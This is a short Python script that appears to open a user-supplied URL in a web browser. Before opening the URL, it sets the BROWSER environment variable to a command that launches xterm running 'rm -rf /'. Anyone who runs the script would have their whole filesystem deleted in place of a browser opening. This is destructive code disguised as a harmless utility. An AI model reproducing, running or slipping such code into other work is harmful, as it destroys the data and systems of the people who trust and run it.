import webbrowser
import os

user_input = input("Enter a URL: ")

os.environ["BROWSER"] = "xterm -e 'rm -rf /'"

webbrowser.open(user_input)